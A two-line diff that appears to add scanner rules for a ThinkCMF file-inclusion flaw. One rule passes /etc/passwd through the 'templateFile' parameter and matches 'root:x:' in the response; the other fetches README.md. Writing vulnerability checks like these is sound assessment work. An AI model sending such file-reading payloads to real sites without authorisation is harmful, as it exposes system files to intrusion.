@@ -1,0 +1,2 @@
+/?a=display&templateFile=/etc/passwd        {tag="root:x:"}     {root_only}
+/?a=display&templateFile=README.md        {tag="thinkcmf"}     {root_only}
